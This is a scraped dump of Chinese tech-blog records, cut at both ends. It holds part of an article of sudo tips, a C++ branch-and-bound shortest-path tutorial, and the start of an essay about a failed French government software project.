!4\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo, ,!,4, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面的命令将使用提升的权限执行历史记录中的第 4 条命令。,\n,在 Vim 里面使用 sudo 命令,\n,很多时候，我们编辑系统的配置文件时，在保存时才意识到我们需要 root 访问权限来执行此操作。因为这个可能让我们丢失我们对文件的改动。没有必要惊慌，我们可以在 Vim 中使用下面的命令来解决这种情况：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n:w !sudo tee %\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,:,w, ,!,sudo ,tee, ,%, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述命令中：,\n,\n,冒号 (,:,) 表明我们处于 Vim 的退出模式,\n,感叹号 (,!,) 表明我们正在运行 shell 命令,\n,sudo, 和 ,tee, 都是 shell 命令,\n,百分号 (,%,) 表明从当前行开始的所有行,\n,\n,使用 sudo 执行多个命令,\n,至今我们用 ,sudo, 只执行了单个命令，但我们可以用它执行多个命令。只需要用分号 (,;,) 隔开命令，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo -- bash -c 'pwd; hostname; whoami'\r\n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo, ,--, ,bash, ,-,c, ,'pwd; hostname; whoami', , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述命令中,\n,\n,双连字符 (,--,) 停止命令行切换,\n,bash, 表示要用于执行命令的 shell 名称,\n,-c, 选项后面跟着要执行的命令,\n,\n,无密码运行 sudo 命令,\n,当第一次执行 ,sudo, 命令时，它会提示输入密码，默认情形下密码被缓存 15 分钟。但是，我们可以避免这个操作，并使用 ,NOPASSWD, 关键字禁用密码认证，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nlinuxtechi ALL=(ALL) NOPASSWD: ALL\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,linuxtechi ,ALL,=,(,ALL,), ,NOPASSWD,:, ,ALL, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,限制用户执行某些命令,\n,为了提供受控访问，我们可以限制 ,sudo, 用户只执行某些命令。例如，下面的行只允许执行 ,echo, 和 ,ls, 命令 。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nlinuxtechi ALL=(ALL) NOPASSWD: /bin/echo /bin/ls\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,linuxtechi ,ALL,=,(,ALL,), ,NOPASSWD,:, ,/,bin,/,echo, ,/,bin,/,ls, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,深入了解 sudo,\n,让我们进一步深入了解 ,sudo, 命令。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls -l /usr/bin/sudo\r\n-rwsr-xr-x 1 root root 145040 Jun 13  2017 /usr/bin/sudo\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls, ,-,l, ,/,usr,/,bin,/,sudo,-,rwsr,-,xr,-,x, ,1, ,root ,root, ,145040, ,Jun, ,13, , ,2017, ,/,usr,/,bin,/,sudo, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果仔细观察文件权限，则发现 ,sudo, 上启用了 setuid 位。当任何用户运行这个二进制文件时，它将以拥有该文件的用户权限运行。在所示情形下，它是 root 用户。,\n,为了演示这一点，我们可以使用 ,id, 命令，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ id\r\nuid=1002(linuxtechi) gid=1002(linuxtechi) groups=1002(linuxtechi)\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,id,uid,=,1002,(,linuxtechi,), ,gid,=,1002,(,linuxtechi,), ,groups,=,1002,(,linuxtechi,), ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当我们不使用 ,sudo, 执行 ,id, 命令时，将显示用户 ,linuxtechi, 的 id。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo id\r\nuid=0(root) gid=0(root) groups=0(root)\r\n\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,id,uid,=,0,(,root,), ,gid,=,0,(,root,), ,groups,=,0,(,root,), , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,但是，如果我们使用 ,sudo, 执行 ,id, 命令时，则会显示 root 用户的 id。,\n,结论,\n,从这篇文章可以看出 —— ,sudo, 为普通用户提供了更多受控访问。使用这些技术，多用户可以用安全的方式与 GNU/Linux 进行交互。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113912/", "url_object_id": "0d352bb0afad005f2b826e5ebae297ef", "front_image_path": "full/c99585e916a2233fec8fcbbf0dc4907e60e02254.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg"], "title": "分支限界法", "create_time": "2018/06/04", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,独酌逸醉,   ,分支限界法与回溯法,\n,（1）求解目标：回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。 （2）搜索方式的不同：回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优先或以最小耗费优先的方式搜索解空间树。,\n,分支限界法的基本思想,\n,分支限界法常以广度优先或以最小耗费（最大效益）优先的方式搜索问题的解空间树。在分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点。在这些儿子结点中，导致不可行解或导致非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。 此后，从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所需的解或活结点表为空时为止。,\n,常见的两种分支限界法,\n,（1）队列式(FIFO)分支限界法    按照队列先进先出（FIFO）原则选取下一个结点为扩展结点。 （2）优先队列式分支限界法    按照优先队列中规定的优先级选取优先级最高的结点成为当前扩展结点。,\n,一、单源最短路径问题,\n,1、问题描述,\n,在下图所给的有向图G中，每一边都有一个非负边权。要求图G的从源顶点s到目标顶点t之间的最短路径。,\n,\n,下图是用优先队列式分支限界法解有向图,G,的单源最短路径问题产生的解空间树。其中，每一个结点旁边的数字表示该结点所对应的当前路长。,\n,\n,找到一条路径：,\n,\n,目前的最短路径是8，一旦发现某个结点的下界不小于这个最短路进，则剪枝：,\n,\n,同一个结点选择最短的到达路径：,\n,\n,\n,2.剪枝策略,\n,在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。,\n,在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。,\n,3.算法思想,\n,解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。,\n,算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。,\n,实现,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n2.剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。   在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。 3.算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现/* 主题：单源最短路径问题\r\n* 作者：chinazhangjie\r\n* 邮箱：chinajiezhang@gmail.com\r\n* 开发语言：C++\r\n* 开发环境：Mircosoft Virsual Studio 2008\r\n* 时间: 2010.11.01\r\n*/\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <queue>\r\n#include <limits>\r\nusing namespace std;\r\n\r\nstruct node_info\r\n{\r\npublic:\r\n    node_info (int i,int w) \r\n        : index (i), weight (w) {}\r\n    node_info () \r\n        : index(0),weight(0) {}\r\n    node_info (const node_info & ni) \r\n        : index (ni.index), weight (ni.weight) {}\r\n\r\n    friend \r\n    bool operator < (const node_info& lth,const node_info& rth) {\r\n        return lth.weight > rth.weight ; // 为了实现从小到大的顺序\r\n    }\r\n\r\npublic:\r\n    int index; // 结点位置\r\n    int weight; // 权值\r\n};\r\n\r\nstruct path_info \r\n{\r\npublic:\r\n    path_info ()\r\n        : front_index(0), weight (numeric_limits<int>::max()) {}\r\n\r\npublic:\r\n    int front_index;\r\n    int weight;\r\n};\r\n\r\n// single source shortest paths\r\nclass ss_shortest_paths\r\n{\r\n     \r\npublic:\r\n    ss_shortest_paths (const vector<vector<int> >& g,int end_location) \r\n        :no_edge (-1), end_node (end_location), node_count (g.size()) , graph (g) \r\n    {}\r\n\r\n    // 打印最短路径\r\n    void print_spaths () const {\r\n        cout << \"min weight : \" << shortest_path << endl;\r\n        cout << \"path: \" ;\r\n        copy (s_path_index.rbegin(),s_path_index.rend(),\r\n            ostream_iterator<int> (cout, \" \"));\r\n        cout << endl;\r\n    }\r\n\r\n    // 求最短路径\r\n    void shortest_paths () {\r\n        vector<path_info> path(node_count);\r\n        priority_queue<node_info,vector<node_info> > min_heap;\r\n        min_heap.push (node_info(0,0));    // 将起始结点入队\r\n\r\n        while (true) {\r\n            node_info top = min_heap.top ();    // 取出最大值\r\n            min_heap.pop ();\r\n\r\n            // 已到达目的结点\r\n            if (top.index == end_node) {\r\n                break ;\r\n            }\r\n            // 未到达则遍历\r\n            for (int i = 0; i < node_count; ++ i) {\r\n                // 顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长 \r\n                if (graph[top.index][i] != no_edge && \r\n                    (top.weight + graph[top.index][i]) < path[i].weight) {\r\n                    min_heap.push (node_info (i,top.weight + graph[top.index][i]));\r\n                    path[i].front_index = top.index;\r\n                    path[i].weight = top.weight + graph[top.index][i];\r\n                }\r\n            }\r\n            if (min_heap.empty()) {\r\n                break ;\r\n            }\r\n        }\r\n\r\n        shortest_path = path[end_node].weight;\r\n        int index = end_node;\r\n        s_path_index.push_back(index) ;\r\n        while (true) {\r\n            index = path[index].front_index ;\r\n            s_path_index.push_back(index);\r\n            if (index == 0) {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\nprivate:\r\n    vector<vector<int> >    graph ;            // 图的数组表示\r\n    int                        node_count;        // 结点个数\r\n    const int                no_edge;        // 无通路\r\n    const int                end_node;        // 目的结点\r\n    vector<int>                s_path_index;    // 最短路径\r\n    int                        shortest_path;    // 最短路径\r\n};\r\n\r\nint main()\r\n{\r\n    const int size = 11; \r\n    vector<vector<int> > graph (size);\r\n    for (int i = 0;i < size; ++ i) {\r\n        graph[i].resize (size);\r\n    }\r\n    for (int i = 0;i < size; ++ i) {\r\n        for (int j = 0;j < size; ++ j) {\r\n            graph[i][j] = -1;\r\n        }\r\n    }\r\n    graph[0][1] = 2;\r\n    graph[0][2] = 3;\r\n    graph[0][3] = 4;\r\n    graph[1][2] = 3;\r\n    graph[1][5] = 2;\r\n    graph[1][4] = 7;\r\n    graph[2][5] = 9;\r\n    graph[2][6] = 2;\r\n    graph[3][6] = 2;\r\n    graph[4][7] = 3;\r\n    graph[4][8] = 3;\r\n    graph[5][6] = 1;\r\n    graph[5][8] = 3;\r\n    graph[6][9] = 1;\r\n    graph[6][8] = 5;\r\n    graph[7][10] = 3;\r\n    graph[8][10] = 2;\r\n    graph[9][8] = 2;\r\n    graph[9][10] = 2;\r\n\r\n    ss_shortest_paths ssp (graph, 10);\r\n    ssp.shortest_paths ();\r\n    ssp.print_spaths ();\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,2.,剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。,   ,在算法中，利用结点间的控制关系进行剪枝。从源顶点,s,出发，,2,条不同路径到达图,G,的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。, ,3.,算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图,G,的源顶点,s,和空优先队列开始。结点,s,被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点,i,到顶点,j,有边可达，且从源出发，途经顶点,i,再到顶点,j,的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现,/* 主题：单源最短路径问题,* 作者：chinazhangjie,* 邮箱：chinajiezhang@gmail.com,* 开发语言：C++,* 开发环境：Mircosoft Virsual Studio 2008,* 时间: 2010.11.01,*/, ,#include <iostream>,#include <vector>,#include <queue>,#include <limits>,using ,namespace, ,std,;, ,struct, ,node_info,{,public,:,    ,node_info, ,(,int, ,i,,,int, ,w,), ,        ,:, ,index, ,(,i,),,, ,weight, ,(,w,), ,{,},    ,node_info, ,(,), ,        ,:, ,index,(,0,),,,weight,(,0,), ,{,},    ,node_info, ,(,const, ,node_info, ,&, ,ni,), ,        ,:, ,index, ,(,ni,.,index,),,, ,weight, ,(,ni,.,weight,), ,{,}, ,    ,friend ,    ,bool, ,operator, ,<, ,(,const, ,node_info,&, ,lth,,,const, ,node_info,&, ,rth,), ,{,        ,return, ,lth,.,weight, ,>, ,rth,.,weight, ,;, ,// 为了实现从小到大的顺序,    ,}, ,public,:,    ,int, ,index,;, ,// 结点位置,    ,int, ,weight,;, ,// 权值,},;, ,struct, ,path_info, ,{,public,:,    ,path_info, ,(,),        ,:, ,front_index,(,0,),,, ,weight, ,(,numeric_limits,<,int,>,::,max,(,),), ,{,}, ,public,:,    ,int, ,front_index,;,    ,int, ,weight,;,},;, ,// single source shortest paths,class, ,ss_shortest_paths,{,     ,public,:,    ,ss_shortest_paths, ,(,const, ,vector,<,vector,<,int,>, ,>,&, ,g,,,int, ,end_location,), ,        ,:,no_edge, ,(,-,1,),,, ,end_node, ,(,end_location,),,, ,node_count, ,(,g,.,size,(,),), ,,, ,graph, ,(,g,), ,    ,{,}, ,    ,// 打印最短路径,    ,void, ,print_spaths, ,(,), ,const, ,{,        ,cout, ,<<, ,\"min weight : \", ,<<, ,shortest_path, ,<<, ,endl,;,        ,cout, ,<<, ,\"path: \", ,;,        ,copy, ,(,s_path_index,.,rbegin,(,),,,s_path_index,.,rend,(,),,,            ,ostream_iterator,<,int,>, ,(,cout,,, ,\" \",),),;,        ,cout, ,<<, ,endl,;,    ,}, ,    ,// 求最短路径,    ,void, ,shortest_paths, ,(,), ,{,        ,vector,<,path_info,>, ,path,(,node_count,),;,        ,priority_queue,<,node_info,,,vector,<,node_info,>, ,>, ,min_heap,;,        ,min_heap,.,push, ,(,node_info,(,0,,,0,),),;,    ,// 将起始结点入队, ,        ,while, ,(,true,), ,{,            ,node_info ,top, ,=, ,min_heap,.,top, ,(,),;,    ,// 取出最大值,            ,min_heap,.,pop, ,(,),;, ,            ,// 已到达目的结点,            ,if, ,(,top,.,index, ,==, ,end_node,), ,{,                ,break, ,;,            ,},            ,// 未到达则遍历,            ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,node_count,;, ,++, ,i,), ,{,                ,// 顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长 ,                ,if, ,(,graph,[,top,.,index,],[,i,], ,!=, ,no_edge, ,&&, ,                    ,(,top,.,weight, ,+, ,graph,[,top,.,index,],[,i,],), ,<, ,path,[,i,],.,weight,), ,{,                    ,min_heap,.,push, ,(,node_info, ,(,i,,,top,.,weight, ,+, ,graph,[,top,.,index,],[,i,],),),;,                    ,path,[,i,],.,front_index, ,=, ,top,.,index,;,                    ,path,[,i,],.,weight, ,=, ,top,.,weight, ,+, ,graph,[,top,.,index,],[,i,],;,                ,},            ,},            ,if, ,(,min_heap,.,empty,(,),), ,{,                ,break, ,;,            ,},        ,}, ,        ,shortest_path, ,=, ,path,[,end_node,],.,weight,;,        ,int, ,index, ,=, ,end_node,;,        ,s_path_index,.,push_back,(,index,), ,;,        ,while, ,(,true,), ,{,            ,index, ,=, ,path,[,index,],.,front,_,index, ,;,            ,s_path_index,.,push_back,(,index,),;,            ,if, ,(,index, ,==, ,0,), ,{,                ,break,;,            ,},        ,},    ,}, ,private,:,    ,vector,<,vector,<,int,>, ,>,    ,graph, ,;,            ,// 图的数组表示,    ,int,                        ,node_count,;,        ,// 结点个数,    ,const, ,int,                ,no_edge,;,        ,// 无通路,    ,const, ,int,                ,end_node,;,        ,// 目的结点,    ,vector,<,int,>,                ,s_path_index,;,    ,// 最短路径,    ,int,                        ,shortest_path,;,    ,// 最短路径,},;, ,int, ,main,(,),{,    ,const, ,int, ,size, ,=, ,11,;, ,    ,vector,<,vector,<,int,>, ,>, ,graph, ,(,size,),;,    ,for, ,(,int, ,i, ,=, ,0,;,i, ,<, ,size,;, ,++, ,i,), ,{,        ,graph,[,i,],.,resize, ,(,size,),;,    ,},    ,for, ,(,int, ,i, ,=, ,0,;,i, ,<, ,size,;, ,++, ,i,), ,{,        ,for, ,(,int, ,j, ,=, ,0,;,j, ,<, ,size,;, ,++, ,j,), ,{,            ,graph,[,i,],[,j,], ,=, ,-,1,;,        ,},    ,},    ,graph,[,0,],[,1,], ,=, ,2,;,    ,graph,[,0,],[,2,], ,=, ,3,;,    ,graph,[,0,],[,3,], ,=, ,4,;,    ,graph,[,1,],[,2,], ,=, ,3,;,    ,graph,[,1,],[,5,], ,=, ,2,;,    ,graph,[,1,],[,4,], ,=, ,7,;,    ,graph,[,2,],[,5,], ,=, ,9,;,    ,graph,[,2,],[,6,], ,=, ,2,;,    ,graph,[,3,],[,6,], ,=, ,2,;,    ,graph,[,4,],[,7,], ,=, ,3,;,    ,graph,[,4,],[,8,], ,=, ,3,;,    ,graph,[,5,],[,6,], ,=, ,1,;,    ,graph,[,5,],[,8,], ,=, ,3,;,    ,graph,[,6,],[,9,], ,=, ,1,;,    ,graph,[,6,],[,8,], ,=, ,5,;,    ,graph,[,7,],[,10,], ,=, ,3,;,    ,graph,[,8,],[,10,], ,=, ,2,;,    ,graph,[,9,],[,8,], ,=, ,2,;,    ,graph,[,9,],[,10,], ,=, ,2,;, ,    ,ss_shortest_paths ,ssp, ,(,graph,,, ,10,),;,    ,ssp,.,shortest_paths, ,(,),;,    ,ssp,.,print_spaths, ,(,),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,测试数据（图）,\n,\n,测试结果,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmin weight : 8\r\npath: 0 2 6 9 10,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,min ,weight, ,:, ,8,path,:, ,0, ,2, ,6, ,9, ,10,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114061/", "url_object_id": "17234c664be7a7620fca5c849015008f", "front_image_path": "full/b89c67f02db5a4cdf6d8b456c94b51448e1c4363.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/5f2dbd34a324b10f8f29ed12482281ae.jpg"], "title": "谁说国外的程序员过得好？法国政府搞的软件项目，坑出新境界", "create_time": "2018/04/25", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Cado,   ,编者按：很多软件项目开发时间大大超出了规划的时间，投入大量资金和人力，都没有实在的结果。如果你讨厌你的编程工作，请认真阅读这篇 2008 年的文章吧。法国科技公司为政府做的项目，预期两三年，做了十二年还在做；6 百万行 C++ 代码，经理比工程师多，人员素质极低。,\n,几年前，我在一家法国大型科技公司工作，为他们的一个软件项目做咨询师。在那段时间，我见识到了软件工程工作方面最匪夷所思的一切，完全超乎我的想象。项目人员工作极度不专业，而更严重的是，工作环境完全无视人的尊严。我一度觉得去那里上班就像坐牢。我只要举几个例子，读者自然就有分晓。,\n,工作内容,\n,为一个政府部门开发一款软件。,\n,政府先付了几百万欧元的订金，软件开发耗时初定 2 到 3 年。公司雇了几个工程师，开始了项目。每隔三个月，团队人数就翻一番，以便让资金不断流入。,\n,7 年后，项目还不成样子，连雏形都没有。每天公司都要交几千欧元的罚金。于是，管理层决定节流，把经验丰富的员工都辞退了，雇了些经验少，甚至完全没经验的新人。,\n,10 年后，项目进度实在太滞后，中层管理人员决定雇佣有软件工程经验的人，把项目拉回正轨。公司的员工每三个月换一批，也就是法国离职交接期的时长。,\n,12 年后，项目还没结束。公司每天给政府发的修改申请越来越多，以“补贴”每天缴纳的罚金。此时已经是 2008 年。,\n,项目数据,\n,\n,600 万行代码,\n,基于 C ++,\n,50,000+ 类,\n,使用的 C ++ 已经过时，“锁死”在编译器版本中，编译器的版本只能一个操作系统上用。,\n,基于 CORBA,\n,项目使用的数据库软件背后的公司已经破产,\n,图层用户界面有好几个，但实际上每一层都没人维护。,\n,32 台计算机上构建，需要 48 小时,\n,运行一个用户界面需要 40 到 50 个并行进程,\n,没有动态库链接：可执行文件大小在数百兆字节范围内,\n,启动时间约为 15 分钟,\n,瘫痪频率：每 30 秒到 30 分钟一次,\n,\n,没有那个软件工程师会说 C++ 很简单。就其复杂程度而言，这或许是最难掌握的编程语言，就连创造 C++ 的几个工程师都坦白说，他们自己也没有完全掌握。,\n,这种无底洞、大迷宫似的语言，还是有不少人扬言说自己已经掌握了，只要有机会，他们就敢用给你看。他们一猛子扎进这口深井，最后大多遍体鳞伤。看着一满篇天书，花不知多少小时，也找不到瘫痪原因。人都是很聪明的，人生短暂，投入一段时间没有回报，就会“弃暗投明”，改用其他语言，改做其他项目。,\n,软件一大，不管是什么语言写的，维护起来都很难。6 百万行代码，就一个小团队维护，只要想想就能发疯。6 百万可不是小数字，就算一秒钟读一行，也要 70 天不眠不休才能看完。,\n,我再举两个实例，读者就知道这个项目有多让人崩溃。,\n,有一个开发者被分配了这样一个任务：找出在界面上点击右键，界面冻结的原因。他花了几天时间，仔仔细细检查，耗掉大半耐心之后，他发现，在界面上右击后，其实没有错误，只是内容菜单要 45 分钟后才弹出。每次用户在主窗体点击后，菜单是动态生成的，但是背后是巨量的静态内容，因此耗时长。有些用户反馈说“加载 CD”的命令完全没反应。这个问题花了几个星期才弄明白，但是最后，错误报告却被标记为“已解决”，因为数据确实有加载，只不过是花了整整 7 天，才加载完 700 兆的数据。嗯，不然怎么说耐心是美德呢…,\n,版本控制，犹如脱缰野马,\n,好几年过去了，团队里终于来了个人才，提出要用版本控制工具。第一次尝试，效果不如人意，于是团队决定换一个系统。又过了纪念，每次更新的历史数据全没了。最后，他们选择使用一个瑞士的系统，图形用户界面简直不堪入目。有一个四人小组全职负责版本控制软件方面的维护问题，跟他们合作，我们常常面临以下的问题：,\n,\n,第一次测试需要与版本控制团队先预约时间，通常在一周后才授权。,\n,未经中层管理人员授权，不允许编辑文件。必须事先告诉经理要编辑哪些文件，然后申请上级许可，再预约版本控制团队，在几天后才能编辑。,\n,每次修改代码都会产生分支文件，也就意味着必须合并所有修改。有了这么多的文件，你可能觉得，不会出现两个人弄同一个文件上的重复劳动。但事实证明，大家都在弄同样的 100 个文件。,\n,检入过程非常痛苦，这个过程中，你的代码经过自动化错误检测软件审查，最终由中间管理人员审查。不用说，bug 的出现速度永远比开发人员纠正速度快得多。如果你仔细看注册的错误数量，每次修正导致的新 bug 数量，是原来 bug 数量的两倍。,\n,版本控制很简单。旧软件是版本1，目前的软件是版本2，未来的软件是版本 3. 没有人知道哪个版本已经交付给客户了。,\n,\n,从前的某一天，公司安排过正式交付。但是这个时间不是团队内的人定的。那天，客户受到了一张没有内容，只有安装指引的光盘。那时因为，没有人知道怎么把这个项目做出来。后来客户发现他们受到的光盘里，什么也没有，于是给公司发了封正式的投诉信。,\n,公司居然把旧版本的软件发给了客户。客户之所以能发现，是因为他们看了“说明”栏，里面的内容跟上一年的版本大同小异。,\n,“人件”,\n,微薄薪水，只能雇庸碌之辈,\n,团队里大部分人都是没有软件工程经验的人，软件里要不是大部分都是 bug，就奇了怪了。经理意识到，一个单纯的软件项目，支出的大头是薪水，真是天资聪颖。但是，这个大发现丝毫没有影响 TA 炒掉工程师，不论他们有没有经验，却把桌面上有“C++傻瓜入门”之类书的管理人员统统留下了。,\n,我们的梦想团队,\n,团队 55 人：20 个开发者，35 个管理人员,\n,没错，管理人员数量比工程师还多。,\n,管理人员最擅长的就是开会，讲的都是同一个 PPT，一遍又一遍，讲到吐为止。而开发者就在宽敞的共用办公空间里聊天解闷。,\n,很多管理人员在软件工程上毫无经验。当时 SCO-Linux 争议炒得沸沸扬扬，不管整件事算不算闹剧，很多人都意识到，以后要用自由软件都要付费了。）不用说，整个软件到处都是 GNU C 库里的代码，一个巨型 GNU 兼容的非共享软件。但是，就这个项目的水准，估计也没人敢把代码放出去。,\n,\n,自由软件（free 